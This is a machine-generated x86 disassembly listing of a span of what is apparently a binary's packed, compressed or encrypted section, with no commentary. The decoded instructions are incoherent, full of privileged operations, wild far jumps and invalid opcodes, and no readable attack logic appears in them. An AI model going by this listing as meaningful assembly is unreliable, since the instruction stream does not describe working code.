  41aa7c:	sub    ebx,edi
  41aa7e:	aas    
  41aa7f:	jp     0x41aa8a
  41aa81:	pop    esi
  41aa82:	jmp    0x2a9c1028
  41aa87:	mov    fs,WORD PTR [ebx+ecx*8-0x5db724f8]
  41aa8e:	daa    
  41aa8f:	jle    0x41aa16
  41aa91:	les    ebx,FWORD PTR [ebx-0x33]
  41aa94:	retf   0x2ebd
  41aa97:	inc    edi
  41aa98:	pop    es
  41aa99:	sti    
  41aa9a:	push   0x24
  41aa9c:	mov    DWORD PTR [esi+0x58],0xe2b300b8
  41aaa3:	rol    DWORD PTR [eax],cl
  41aaa5:	fsubrp st(5),st
  41aaa7:	std    
  41aaa8:	mov    ds:0xfcf68a9c,eax
  41aaad:	daa    
  41aaae:	xchg   BYTE PTR [ecx-0x3],ch
  41aab1:	jmp    0x41ab09
  41aab3:	sbb    BYTE PTR [ebp-0x47fe7016],cl
  41aab9:	mov    ds:0x79899bcf,eax
  41aabe:	lods   al,BYTE PTR ss:[esi]
  41aac0:	push   ebx
  41aac1:	mov    dl,0xcf
  41aac3:	cdq    
  41aac4:	jnp    0x41ab32
  41aac6:	pop    eax
  41aac7:	in     eax,0xe9
  41aac9:	mov    al,0xa9
  41aacb:	jns    0x41aa96
  41aacd:	sbb    al,0xcd
  41aacf:	xor    DWORD PTR [edi+edx*8],0x95e13fd5
  41aad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aad7:	or     ebp,DWORD PTR [ecx+0x58]
  41aada:	xor    ebx,0x3b3df1a6
  41aae0:	aas    
  41aae1:	xor    edx,DWORD PTR [edi-0x63]
  41aae4:	ins    DWORD PTR es:[edi],dx
  41aae5:	int3   
  41aae6:	fwait
  41aae7:	xchg   BYTE PTR [ecx],ch
  41aae9:	sbb    eax,0x72ef8e04
  41aaee:	addr16 (bad) 
  41aaf0:	pop    ss
  41aaf1:	dec    esp
  41aaf2:	stos   DWORD PTR es:[edi],eax
  41aaf3:	mov    edi,0x9bc1c4b8
  41aaf8:	sbb    ah,BYTE PTR [eax-0x50]
  41aafb:	xor    BYTE PTR [ebp+0x7d],al
  41aafe:	fwait
  41aaff:	call   0x66ae7320
  41ab04:	add    cl,BYTE PTR [ecx]
  41ab06:	std    
  41ab07:	xchg   ebx,eax
  41ab08:	lahf   
  41ab09:	jnp    0x41aae6
  41ab0b:	cmp    al,0x11
  41ab0d:	cwde   
  41ab0e:	outs   dx,DWORD PTR ds:[esi]
  41ab0f:	xor    DWORD PTR [ecx],ebx
  41ab11:	aam    0x95
  41ab13:	sar    BYTE PTR [ebp-0x66],1
  41ab16:	or     esp,0x2ceb3267
  41ab1c:	fisttp WORD PTR [edx-0x3777ffb7]
  41ab22:	adc    al,0x7e
  41ab24:	or     eax,0x8e7b0b21
  41ab29:	es cmp esp,ecx
  41ab2c:	inc    ebx
  41ab2d:	add    DWORD PTR [esp+eax*1],0x39
  41ab31:	fild   QWORD PTR [edx+0x5a]
  41ab34:	jmp    eax
  41ab36:	inc    ebp
  41ab37:	dec    edx
  41ab38:	test   BYTE PTR [edi-0x7],bh
  41ab3b:	jmp    0x41ab54
  41ab3d:	cwde   
  41ab3e:	jae    0x41ab00
  41ab40:	jecxz  0x41aba9
  41ab42:	jecxz  0x41abab
  41ab44:	add    eax,0xfe8ea9c1
  41ab49:	retf   
  41ab4a:	add    BYTE PTR [edx-0x51],ah
  41ab4d:	gs sbb al,0xe5
  41ab50:	jne    0x41ab2c
  41ab52:	push   cs
  41ab53:	sbb    DWORD PTR [esi],edi
  41ab55:	xor    BYTE PTR [ecx],ah
  41ab57:	pop    esi
  41ab58:	arpl   sp,sp
  41ab5a:	mov    ds:0x73ec7454,al
  41ab5f:	jno    0x41ab02
  41ab61:	test   al,0x43
  41ab63:	mov    dh,0x86
  41ab65:	int    0x8e
  41ab67:	sahf   
  41ab68:	jge    0x41ab75
  41ab6a:	mov    cl,0x9a
  41ab6c:	dec    ecx
  41ab6d:	inc    edi
  41ab6e:	ret    0x92e6
  41ab71:	fidiv  DWORD PTR [edi-0x20]
  41ab74:	and    esi,DWORD PTR [edx-0x38634793]
  41ab7a:	and    BYTE PTR [ecx+0x68edcd0f],0x74
  41ab81:	imul   esp,DWORD PTR ds:0xd07b5e66,0x11a9216f
  41ab8b:	popf   
  41ab8c:	add    cl,ah
  41ab8e:	mov    bh,0x6c
  41ab90:	mov    esi,0xd63ed092
  41ab95:	push   edi
  41ab96:	xor    al,0x9e
  41ab98:	add    BYTE PTR [esi+ebp*8],cl
  41ab9b:	adc    al,0x2e
  41ab9d:	mov    dl,0xf9
  41ab9f:	int3   
  41aba0:	jmp    0x3160:0x53c4754a
  41aba7:	xor    eax,0x31e5479e
  41abac:	push   ecx
  41abad:	test   BYTE PTR [edi],bl
  41abaf:	sub    bh,ch
  41abb1:	imul   edx,DWORD PTR ds:0xa902ce16,0x84dad9e6
  41abbb:	xlat   BYTE PTR ds:[ebx]
  41abbc:	mov    bl,0x26
  41abbe:	je     0x41aba5
  41abc0:	call   FWORD PTR [ebx-0x3097b736]
  41abc6:	test   DWORD PTR [esi+ecx*2+0x56b9b46],ebx
  41abcd:	lahf   
  41abce:	cmc    
  41abcf:	adc    bl,BYTE PTR [esi]
  41abd1:	dec    edx
  41abd2:	add    al,0x54
  41abd4:	rcl    DWORD PTR [eax],0x91
  41abd7:	lods   ax,WORD PTR ds:[esi]
  41abd9:	stos   DWORD PTR es:[edi],eax
  41abda:	jg     0x41ac0a
  41abdc:	pushf  
  41abdd:	cdq    
  41abde:	ja     0x41ab9f
  41abe0:	out    0x82,eax
  41abe2:	mov    cs,WORD PTR [edi]
  41abe4:	sbb    BYTE PTR [ebx],0x96
  41abe7:	sbb    al,bh
  41abe9:	jp     0x41ac01
  41abeb:	imul   ebp,ecx,0xe2eee67f
  41abf1:	scas   eax,DWORD PTR es:[edi]
  41abf2:	jge    0x41ac41
  41abf4:	jnp    0x41abfb
  41abf6:	sahf   
  41abf7:	neg    dl
  41abf9:	xor    al,0xc
  41abfb:	inc    esi
  41abfc:	cdq    
  41abfd:	sbb    ebx,DWORD PTR [ecx-0x22704267]
  41ac03:	inc    eax
  41ac04:	clc    
  41ac05:	jl     0x41abef
  41ac07:	mov    al,0x39
  41ac09:	push   eax
  41ac0a:	inc    ebp
  41ac0b:	push   esi
  41ac0c:	cld    
  41ac0d:	icebp  
  41ac0e:	not    BYTE PTR [edx-0x1cc211a]
  41ac14:	(bad)
  41ac17:	iret   
  41ac18:	cmp    BYTE PTR [edi+0x2c],ah
  41ac1b:	ins    BYTE PTR es:[edi],dx
  41ac1c:	gs loope 0x41aba2
  41ac1f:	push   es
  41ac20:	popf   
  41ac21:	pop    edx
  41ac22:	cmp    al,0x3
  41ac24:	push   es
  41ac25:	push   ebx
  41ac26:	sub    BYTE PTR [edx+ebp*4],ch
  41ac29:	jne    0x41ac6e
  41ac2b:	cli    
  41ac2c:	xor    ebp,ecx
  41ac2e:	in     al,dx
  41ac2f:	inc    edi
  41ac30:	std    
  41ac31:	jb     0x41abed
  41ac33:	sbb    al,0x2f
  41ac35:	inc    ecx
  41ac36:	mov    edx,DWORD PTR [ebx-0x21f6e45d]
  41ac3c:	and    eax,esi
  41ac3e:	or     cl,BYTE PTR [ebx+0x22]
  41ac41:	test   al,0xb
  41ac43:	jl     0x41ac3e
  41ac45:	xchg   esp,eax
  41ac46:	jge    0x41ac7d
  41ac48:	arpl   WORD PTR [ecx+0x611a8bc8],cx
  41ac4e:	jnp    0x41ac34
  41ac50:	sti    
  41ac51:	inc    edx
  41ac52:	stos   DWORD PTR es:[edi],eax
  41ac53:	xchg   edx,eax
  41ac55:	xor    al,0xf6
  41ac57:	jecxz  0x41abf4
  41ac59:	mov    esi,0xe121dbed
  41ac5e:	ins    BYTE PTR es:[edi],dx
  41ac5f:	adc    eax,0x8bc959da
  41ac64:	jl     0x41acae
  41ac66:	loope  0x41ac03
  41ac68:	nop
  41ac69:	aad    0x90
  41ac6b:	stos   DWORD PTR es:[edi],eax
  41ac6c:	sar    BYTE PTR [ecx+0x1b],0x4c
  41ac70:	mov    eax,0xd0fb8fdf
  41ac75:	mov    edi,0x66a4f784
  41ac7a:	or     ah,ah
  41ac7c:	adc    DWORD PTR [ebx],ebp
  41ac7e:	sub    al,0xb2
  41ac80:	out    dx,eax
  41ac81:	scas   eax,DWORD PTR es:[edi]
  41ac82:	jbe    0x41aca4
  41ac84:	push   esi
  41ac85:	sbb    eax,0x337eba3d
  41ac8a:	adc    DWORD PTR [eax-0x5fc66be3],ebp
  41ac90:	rep stos DWORD PTR es:[edi],eax
  41ac92:	push   ebp
  41ac93:	int3   
  41ac94:	adc    al,0x2b
  41ac96:	xchg   ecx,esp
  41ac98:	xor    BYTE PTR [ebx],dh
  41ac9a:	dec    ecx
  41ac9b:	loope  0x41ac28
  41ac9d:	fcomp  QWORD PTR [edx]
  41ac9f:	mov    eax,0x60c3c384
  41aca4:	test   ebx,ecx
  41aca6:	mov    DWORD PTR [edi+0x1d],esp
  41aca9:	mov    ds:0x889fce92,al
  41acae:	stos   DWORD PTR es:[edi],eax
  41acaf:	rcr    cl,cl
  41acb1:	retf   
  41acb2:	jnp    0x41acc0
  41acb4:	inc    ebx
  41acb5:	push   ecx
  41acb6:	aas    
  41acb7:	add    DWORD PTR [eax-0x14716b92],esi
  41acbd:	mov    ds:0x72400b55,eax
  41acc2:	(bad)  
  41acc4:	hlt    
  41acc5:	je     0x41acb9
  41acc7:	imul   ebx,ecx,0xfc51a417
  41accd:	xchg   cl,dh
  41accf:	and    al,0xfd
  41acd1:	dec    ebp
  41acd2:	or     eax,0xaa90715b
  41acd7:	push   0xa91cf61e
  41acdc:	xchg   esi,eax
  41acdd:	jge    0x41ad43
  41acdf:	jl     0x41acb1
  41ace1:	xor    al,0xb
  41ace3:	inc    esi
  41ace4:	push   edi
  41ace5:	les    ebx,FWORD PTR [eax-0x4f897cf4]
  41aceb:	(bad)  
  41acec:	jnp    0x41ad44
  41acee:	or     ch,cl
  41acf0:	inc    edi
  41acf1:	aas    
  41acf2:	add    edx,ebp
  41acf4:	xchg   ebp,eax
  41acf5:	nop
  41acf6:	push   ebx
  41acf7:	xor    dl,BYTE PTR [edx-0x3d]
  41acfa:	add    ecx,DWORD PTR [edx+0x644e146a]
  41ad00:	fidiv  WORD PTR [edx-0xc462e29]
  41ad06:	or     BYTE PTR [ebp+0x68],bh
  41ad09:	and    al,BYTE PTR [ecx+0x2ca3634]
  41ad0f:	jmp    0x10d4bc2c
  41ad14:	jae    0x41ad6e
  41ad16:	cmp    eax,0xd71fefe6
  41ad1b:	add    dl,BYTE PTR [ebp-0x55]
  41ad1e:	cli    
  41ad1f:	sbb    edx,DWORD PTR [eax]
  41ad21:	call   0xe940ebf
  41ad26:	(bad)
  41ad2a:	inc    ebp
  41ad2b:	mov    ebp,0x3b372f2b
  41ad30:	(bad)  
  41ad31:	xor    esi,ebx
  41ad33:	lea    esi,[eax+ebp*8]
  41ad36:	test   eax,0xe510201a
  41ad3b:	or     edi,DWORD PTR [ecx]
  41ad3d:	and    al,BYTE PTR [edi+0x309a40f7]
  41ad43:	int3   
  41ad44:	arpl   WORD PTR [ebx-0x52f90149],bx
  41ad4a:	aaa    
  41ad4b:	idiv   BYTE PTR [esp+esi*1+0x28]
  41ad4f:	loop   0x41adcf
  41ad51:	rcr    DWORD PTR [esi+0x2b1e792c],1
  41ad57:	dec    esp
  41ad58:	xor    eax,0xfcfd0025
  41ad5d:	sti    
  41ad5e:	push   eax
  41ad5f:	ds leave 
  41ad61:	sub    bl,BYTE PTR ds:0xb059cf37
  41ad67:	enter  0x15f4,0xb
  41ad6b:	xchg   ebx,eax
  41ad6c:	pop    es
  41ad6d:	ins    DWORD PTR es:[edi],dx
  41ad6e:	xlat   BYTE PTR ds:[ebx]
  41ad6f:	sbb    bh,BYTE PTR [ebx+ecx*2+0x5b]
  41ad73:	aas    
  41ad74:	fdiv   QWORD PTR [edi+esi*2+0x2]
  41ad78:	(bad)  
  41ad79:	jmp    0xc1b4d2f1
  41ad7e:	mov    dl,0x1d
  41ad80:	leave  
  41ad81:	out    0xac,al
  41ad83:	cmp    esi,DWORD PTR [edx-0x54]
  41ad86:	hlt    
  41ad87:	xor    eax,0x3e99f180
  41ad8c:	leave  
  41ad8d:	mov    bl,0x88
  41ad8f:	not    bl
  41ad91:	inc    ecx
  41ad92:	push   ebx
  41ad93:	aas    
  41ad94:	repz mov cl,0x12
  41ad97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad98:	sahf   
  41ad99:	cs jno 0x41addd
  41ad9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad9d:	xchg   BYTE PTR [ebp+edi*8+0x17],dl
  41ada1:	pop    ecx
  41ada2:	movlps QWORD PTR [edx+0x521d7e44],xmm4
  41ada9:	mov    eax,0x37451d4d
  41adae:	push   0x2e
  41adb0:	ja     0x41ae09
  41adb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adb3:	lock pop edi
  41adb5:	test   al,0x9f
  41adb7:	xchg   ecx,eax
  41adb8:	aas    
  41adb9:	shr    BYTE PTR [eax],1
  41adbb:	ret    0xb6c1
  41adbe:	push   ecx
  41adbf:	adc    BYTE PTR [esi-0x280101e0],ch
  41adc5:	and    BYTE PTR [edx],bh
  41adc7:	and    al,0x33
  41adc9:	adc    DWORD PTR [eax+0x7c85f814],esp
  41adcf:	mov    esp,0x31c04fb0
  41add4:	or     DWORD PTR [esi+0x52],ebx
  41add7:	lods   eax,DWORD PTR ds:[esi]
  41add8:	inc    ebx
  41add9:	imul   edx,DWORD PTR [eax+edi*4+0x1f],0xcddb2c34
  41ade1:	dec    esp
  41ade2:	mov    ch,0x81
  41ade4:	and    ecx,edx
  41ade6:	imul   esp,DWORD PTR [edx],0x16b8a06
  41adec:	sbb    DWORD PTR [edi-0x3952976f],ebp
  41adf2:	js     0x41ae01
  41adf4:	jecxz  0x41adf9
  41adf6:	test   eax,0xcf4f4eb
  41adfb:	or     al,BYTE PTR [esi+ecx*1+0x5a87acd9]
  41ae02:	add    BYTE PTR [eax+0x2f],0x7f
  41ae06:	daa    
  41ae07:	sub    cl,dh
  41ae09:	push   0xffffff82
  41ae0b:	fcom   DWORD PTR [eax-0x48657389]
  41ae11:	sbb    al,0x4e
  41ae13:	retf   0x6e77
  41ae16:	les    eax,FWORD PTR [edi]
  41ae18:	mov    eax,ds:0x6d5c47c2
  41ae1d:	les    ebx,FWORD PTR [edi-0x1c3abed8]
  41ae23:	imul   ecx,DWORD PTR [esi],0x62ccfb24
  41ae29:	or     DWORD PTR [esi],esp
  41ae2b:	pop    ds
  41ae2c:	cmp    ecx,esp
  41ae2e:	push   esp
  41ae2f:	lahf   
  41ae30:	leave  
  41ae31:	ret    0x810b
  41ae34:	js     0x41aea9
  41ae36:	jno    0x41ae90
  41ae38:	jb     0x41ae11
  41ae3a:	jb     0x41adf3
  41ae3c:	fcom   DWORD PTR [ecx]
  41ae3e:	add    edx,ebx
  41ae40:	fadd   st,st(4)
  41ae42:	pop    esp
  41ae43:	popf   
  41ae44:	pop    edx
  41ae45:	adc    al,0x55
  41ae47:	jmp    FWORD PTR [edx+0x3b]
  41ae4a:	inc    ebp
  41ae4b:	adc    DWORD PTR [esi-0x299ac0a4],0xbd770d56
  41ae55:	loopne 0x41ae4a
  41ae57:	sub    eax,0xf184cf2e
  41ae5c:	push   ebp
  41ae5d:	lock cli 
  41ae5f:	jge    0x41ae44
  41ae61:	pop    edx
  41ae62:	mov    cl,BYTE PTR [esi]
  41ae64:	aas    
  41ae65:	fisttp WORD PTR [ebx+0x65]
  41ae68:	mov    al,0xb8
  41ae6a:	xor    ebx,ebp
  41ae6c:	sti    
  41ae6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae6e:	push   ecx
  41ae6f:	std    
  41ae70:	aas    
  41ae71:	cmp    al,0x94
  41ae73:	(bad)  [edi-0x7bd8ae6c]
  41ae79:	jp     0x41ae91
  41ae7b:	mov    ecx,0xe0ca5436
  41ae80:	pop    ss
  41ae81:	lea    edx,[edx]
  41ae83:	outs   dx,DWORD PTR ds:[esi]
  41ae84:	xchg   BYTE PTR fs:[ebp+0x29],dl
  41ae88:	xchg   ebp,eax
  41ae89:	mov    edx,ebx
  41ae8b:	fdivrp st(3),st
  41ae8d:	sbb    DWORD PTR [edx-0x66],ebp
  41ae90:	into   
  41ae91:	scas   al,BYTE PTR es:[edi]
  41ae92:	mov    ah,0xf4
  41ae94:	in     al,dx
  41ae95:	out    dx,al
  41ae96:	push   0xe10cd175
  41ae9b:	mov    esp,0xbf82fb7a
  41aea0:	gs ret 0x60fc
  41aea4:	outs   dx,DWORD PTR ds:[esi]
  41aea5:	adc    ebp,DWORD PTR [ebp-0x1727e790]
  41aeab:	cli    
  41aeac:	retf   
  41aead:	inc    eax
  41aeae:	aaa    
  41aeaf:	bound  esi,QWORD PTR [ecx+0x7]
  41aeb2:	jmp    FWORD PTR [edx-0x47606ed]
  41aeb8:	jl     0x41af38
  41aeba:	nop
  41aebb:	push   esp
  41aebc:	outs   dx,DWORD PTR ds:[esi]
  41aebd:	aas    
  41aebe:	add    BYTE PTR [ecx+0x77a2dbd0],bh
  41aec4:	test   bh,ah
  41aec6:	inc    edx
  41aec7:	xchg   ecx,eax
  41aec8:	jg     0x41af46
  41aeca:	or     BYTE PTR [edx+edi*1-0x64],al
  41aece:	mov    es,ebp
  41aed0:	rol    DWORD PTR [edx+0x11],cl
  41aed3:	push   ds
  41aed4:	mov    edx,DWORD PTR [ecx-0x5e]
  41aed7:	and    al,0xa
  41aed9:	std    
  41aeda:	pop    ebp
  41aedb:	adc    dl,BYTE PTR [eax]
  41aedd:	hlt    
  41aede:	jmp    0x4a84ef90
  41aee3:	aaa    
  41aee4:	push   cs
  41aee5:	xor    ah,BYTE PTR [ecx+0x4b8682a8]
  41aeeb:	pop    ds
  41aeec:	jbe    0x41af5f
  41aeee:	fild   DWORD PTR [esp+esi*1+0x67]
  41aef2:	test   al,0xcb
  41aef4:	xchg   cl,dl
  41aef6:	xchg   esp,eax
  41aef7:	pop    eax
  41aef8:	mov    ss,WORD PTR gs:[ebx+0x7a]
  41aefc:	add    dh,BYTE PTR [eax+edx*1]
  41aeff:	cmp    al,0x7
  41af01:	(bad)  
  41af02:	xor    al,0x52
  41af04:	or     DWORD PTR [esi+0x49045b49],edi
  41af0a:	out    dx,eax
  41af0b:	fnstcw WORD PTR [ecx-0x1163fed5]
  41af11:	pop    edi
  41af12:	sub    al,0x8a
  41af14:	sbb    ebp,DWORD PTR [ebx-0x8b0ebbb]
  41af1a:	je     0x41af34
  41af1c:	push   0x35494d19
  41af21:	pop    edi
  41af22:	mov    eax,0x8c6ecb38
  41af27:	sahf   
  41af28:	sahf   
  41af29:	xchg   ebp,eax
  41af2a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af2c:	push   ds
  41af2d:	(bad)  
  41af2e:	stos   DWORD PTR es:[edi],eax
  41af2f:	jp     0x41aeb5
  41af31:	test   al,0xc6
  41af33:	addr16 imul edi,ebp,0xffffffe3
  41af37:	stos   DWORD PTR es:[edi],eax
  41af38:	inc    eax
  41af39:	js     0x41af6d
  41af3b:	mov    edx,0xe835b536
  41af40:	mov    dl,0xf4
  41af42:	cmp    al,0x19
  41af44:	push   ss
  41af45:	inc    esp
  41af46:	or     DWORD PTR [ecx+ebx*1-0x5e6450c2],esi
  41af4d:	adc    eax,ebp
  41af4f:	and    DWORD PTR [esi-0x7ce41a35],ebx
  41af55:	push   ecx
  41af56:	dec    esp
  41af57:	enter  0x9867,0x69
  41af5b:	not    DWORD PTR [edx]
  41af5d:	shr    BYTE PTR [edx+eiz*8-0x2d],0x89
  41af62:	ret    0xef5d
  41af65:	jge    0x41aeef
  41af67:	clc    
  41af68:	mov    bh,ah
  41af6a:	mov    bl,0xf8
  41af6c:	int3   
  41af6d:	sub    eax,ecx
  41af6f:	sub    ecx,0x4a
  41af72:	add    al,al
  41af74:	jg     0x41af41
  41af76:	push   edi
  41af77:	cmp    eax,0x80b989ea
  41af7c:	add    bh,al
  41af7e:	add    eax,0xdabc5af3
  41af83:	shl    DWORD PTR [edi+0x29c42d9d],0x17
  41af8a:	xchg   ebx,eax
  41af8b:	enter  0x53a5,0xcb
  41af8f:	mov    esi,esi
  41af91:	xor    ch,BYTE PTR [esi+0x13]
  41af94:	(bad)  
  41af95:	adc    al,0x25
  41af97:	repz xor eax,0xbecb02da
  41af9d:	mov    ebp,0x403afc9c
  41afa2:	jge    0x41b01b
  41afa4:	push   es
  41afa5:	mov    ?,WORD PTR [eax+0x3422c8d7]
  41afab:	add    bh,BYTE PTR [ecx+0x7]
  41afae:	dec    esi
  41afaf:	scas   al,BYTE PTR es:[edi]
  41afb0:	inc    ecx
  41afb1:	fisttp WORD PTR [ebx-0x3d]
  41afb4:	mov    esi,0x3e7bec43
  41afb9:	add    eax,0xc1dd78f3
  41afbe:	pop    esp
  41afbf:	mov    bh,0x88
  41afc1:	jl     0x41b02c
  41afc3:	fsqrt  
  41afc5:	icebp  
  41afc6:	xlat   BYTE PTR ds:[ebx]
  41afc7:	and    al,0x90
  41afc9:	pop    ss
  41afca:	das    
  41afcb:	hlt    
  41afcc:	clc    
  41afcd:	(bad)  
  41afce:	icebp  
  41afcf:	fisttp WORD PTR [esi+0x7c6f1656]
  41afd5:	ja     0x41afcf
  41afd7:	inc    eax
  41afd8:	xchg   edx,eax
  41afd9:	addr16 (bad) 
  41afdb:	mov    edx,0x44aafe7e
  41afe0:	jbe    0x41b018
  41afe2:	mov    esp,0xd9b5e796
  41afe7:	mov    al,0x82
  41afe9:	mov    esp,0x102e016f
  41afee:	not    DWORD PTR [esi-0x22c75d46]
  41aff4:	fcmovne st,st(7)
  41aff6:	mov    dl,0x42
  41aff8:	xchg   edi,eax
  41aff9:	push   cs
  41affa:	ss inc esi
  41affc:	pop    ds
  41affd:	pop    edi
  41affe:	daa    
  41afff:	stos   BYTE PTR es:[edi],al
  41b000:	sahf   
  41b001:	dec    ebp
  41b002:	lea    ecx,[ebp-0x12]
  41b005:	(bad)  
  41b006:	xor    DWORD PTR [edx],eax
  41b008:	push   cs
  41b009:	mov    edx,es
  41b00b:	and    esi,DWORD PTR [ecx]
  41b00d:	dec    esi
  41b00e:	out    dx,eax
  41b00f:	sti    
  41b010:	scas   eax,DWORD PTR es:[edi]
  41b011:	cmp    esi,DWORD PTR [ebp+0x1a]
  41b014:	mov    al,0xe0
  41b016:	lods   al,BYTE PTR ds:[esi]
  41b017:	sub    al,0xcd
  41b019:	int3   
  41b01a:	ins    BYTE PTR es:[edi],dx
  41b01b:	test   edi,ebp
  41b01d:	test   DWORD PTR [ecx-0x70],edx
  41b020:	sub    al,0xa0
  41b022:	repz jmp 0xb88:0x1e50d2c9
  41b02a:	aas    
  41b02b:	mov    eax,ds:0x7a3704c6
  41b030:	inc    eax
  41b031:	push   ebx
  41b032:	iret   
  41b033:	mov    ebp,0x5f5a5220
  41b038:	mov    dl,0xb6
  41b03a:	lods   al,BYTE PTR ss:[esi]
  41b03c:	fdivp  st(2),st
  41b03e:	jmp    0x41b06f
  41b040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b042:	cld    
  41b043:	or     DWORD PTR [ecx-0x7277d7f4],ebp
  41b049:	xchg   ecx,eax
  41b04a:	test   DWORD PTR [esi+ecx*2-0x784319f3],ebx
  41b051:	imul   ah
  41b053:	inc    ebx
  41b054:	pop    ecx
  41b055:	pop    edx
  41b056:	push   ecx
  41b057:	add    DWORD PTR [eax+0x60bd46e2],edx
  41b05d:	ret    0xa0ae
  41b060:	inc    ebx
  41b061:	or     DWORD PTR [esi],edi
  41b063:	popf   
  41b064:	hlt    
  41b065:	sbb    edx,ebp
  41b067:	push   ss
  41b068:	clc    
  41b069:	inc    edi
  41b06a:	and    al,0xe6
  41b06c:	shl    BYTE PTR [edx],1
  41b06e:	push   0x4a
  41b070:	pushf  
  41b071:	xor    al,0xb1
  41b073:	mov    bl,0x83
  41b075:	push   ebx
  41b076:	xor    al,dh
  41b078:	push   edx
  41b079:	xchg   edi,eax
  41b07a:	ficomp DWORD PTR [edi]
  41b07c:	sub    BYTE PTR [ecx],ah
  41b07e:	test   BYTE PTR [edi+0x39],cl
  41b081:	xor    eax,0xc20ee375
  41b086:	cmc    
  41b087:	mov    bl,0xa3
  41b089:	inc    ecx
  41b08a:	loope  0x41b0ec
  41b08c:	aaa    
  41b08d:	mov    ss,eax
  41b08f:	push   cs
  41b090:	jl     0x41b054
  41b092:	not    edx
  41b094:	or     DWORD PTR [esi+0x4c55a5a3],0xffffff87
  41b09b:	add    al,0x40
  41b09d:	fist   DWORD PTR cs:[esp+edx*2+0x1a]
  41b0a2:	sbb    ecx,DWORD PTR ds:[edi]
  41b0a5:	add    al,0x4f
  41b0a7:	mov    ecx,0x727e597b
  41b0ac:	jmp    0x1517:0xe620e8b
  41b0b3:	test   DWORD PTR [ecx+0x63],edi
  41b0b6:	test   eax,0x8a7fa3fb
  41b0bb:	lods   al,BYTE PTR ds:[esi]
  41b0bc:	xchg   ecx,eax
  41b0bd:	pop    edi
  41b0be:	jae    0x41b113
  41b0c0:	ja     0x41b0bf
  41b0c2:	add    dl,cl
  41b0c4:	into   
  41b0c5:	cld    
  41b0c6:	into   
  41b0c7:	sub    edx,DWORD PTR [ecx-0x7b]
  41b0ca:	test   BYTE PTR [edi+0x69f4d12e],0x63
  41b0d1:	sbb    ecx,DWORD PTR [ecx+0x50]
  41b0d4:	sbb    eax,0x9bc1d3fa
  41b0d9:	mov    esp,0xa5a596f6
  41b0de:	fwait
  41b0df:	cmp    DWORD PTR [esp+ebp*8],ecx
  41b0e2:	out    dx,al
  41b0e3:	adc    BYTE PTR [esi-0x4d],ch
  41b0e6:	mov    DWORD PTR [esi],edx
  41b0e8:	jg     0x41b13c
  41b0ea:	mov    edi,0x8a57517
  41b0ef:	push   es
  41b0f0:	and    al,0x10
  41b0f2:	jp     0x41b13e
  41b0f4:	jnp    0x41b125
  41b0f6:	pop    es
  41b0f7:	xchg   BYTE PTR [eax-0x3846538],dh
  41b0fd:	xchg   edi,eax
  41b0fe:	pop    ebx
  41b0ff:	test   ch,bh
  41b101:	rcr    bh,0xa
  41b104:	mov    dh,0x98
  41b106:	sub    al,0xe7
  41b108:	sbb    al,0x74
  41b10a:	(bad)  
  41b10b:	xchg   ebx,eax
  41b10c:	mov    esi,ebp
  41b10e:	mov    ecx,0xe6535d3c
  41b113:	repz add BYTE PTR [ebp-0xe1850d7],ch
  41b11a:	lea    esp,[ebp-0x783d9040]
  41b120:	and    eax,0x1f192417
  41b125:	mov    esp,0x2c451e93
  41b12a:	in     eax,dx
  41b12b:	test   dh,ah
  41b12d:	jecxz  0x41b0ef
  41b12f:	mov    al,0x26
  41b131:	mov    DWORD PTR [esi-0x4e9c8a8c],ebp
  41b137:	jge    0x41b144
  41b139:	and    dl,BYTE PTR [eax+0x65]
  41b13c:	out    0x35,eax
  41b13e:	sbb    al,0x6c
  41b140:	aad    0x64
  41b142:	push   ss
  41b143:	xor    DWORD PTR [ebp-0x61],edx
  41b146:	sub    eax,0x91b7c3e7
  41b14b:	inc    edx
  41b14c:	int3   
  41b14d:	mov    BYTE PTR [edi],ch
  41b14f:	mov    ?,WORD PTR [ebx-0x510b98da]
  41b155:	mov    esi,DWORD PTR ds:0xd5257a92
  41b15b:	add    cl,bh
  41b15d:	outs   dx,BYTE PTR ds:[esi]
  41b15e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b15f:	pushf  
  41b160:	mov    esp,0xd249bbfc
  41b165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b166:	nop
  41b167:	lahf   
  41b168:	out    0xa7,eax
  41b16a:	scas   al,BYTE PTR es:[edi]
  41b16b:	or     eax,0x54b8b10a
  41b170:	shr    DWORD PTR [eax+0x40],0x82
  41b174:	pop    ebx
  41b175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b176:	jl     0x41b1f4
  41b178:	xchg   DWORD PTR [edx-0x58a184ee],edx
  41b17e:	arpl   WORD PTR [eax+0x519722b1],sp
  41b184:	sbb    al,0xf0
  41b186:	imul   ebx,DWORD PTR [ebx-0x80],0xa56f73e5
  41b18d:	pusha  
  41b18e:	sbb    DWORD PTR [edx],edx
  41b190:	mov    bh,0x78
  41b192:	xlat   BYTE PTR ds:[ebx]
  41b193:	mov    edi,0x8ba63c98
  41b198:	adc    edi,edx
  41b19a:	in     eax,dx
  41b19b:	or     eax,0xba3c08ee
  41b1a0:	std    
  41b1a1:	(bad)  
  41b1a2:	retf   
  41b1a3:	stc    
  41b1a4:	int3   
  41b1a5:	lods   al,BYTE PTR ss:[esi]
  41b1a7:	jo     0x41b185
  41b1a9:	pop    ecx
  41b1aa:	cwde   
  41b1ab:	retf   0x8044
  41b1ae:	push   esi
  41b1af:	lods   eax,DWORD PTR ds:[esi]
  41b1b0:	dec    esp
  41b1b1:	pop    eax
  41b1b2:	sub    al,0xb9
  41b1b4:	addr16 cmp ebp,0x27af0d63
  41b1bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1bc:	or     eax,0xf487c896
  41b1c1:	sub    BYTE PTR ds:0x80a3ef2f,ah
  41b1c7:	adc    DWORD PTR [ebp-0x60],edi
  41b1ca:	jae    0x41b1da
  41b1cc:	xor    dl,BYTE PTR [eax+0x44]
  41b1cf:	sub    dl,BYTE PTR [ecx]
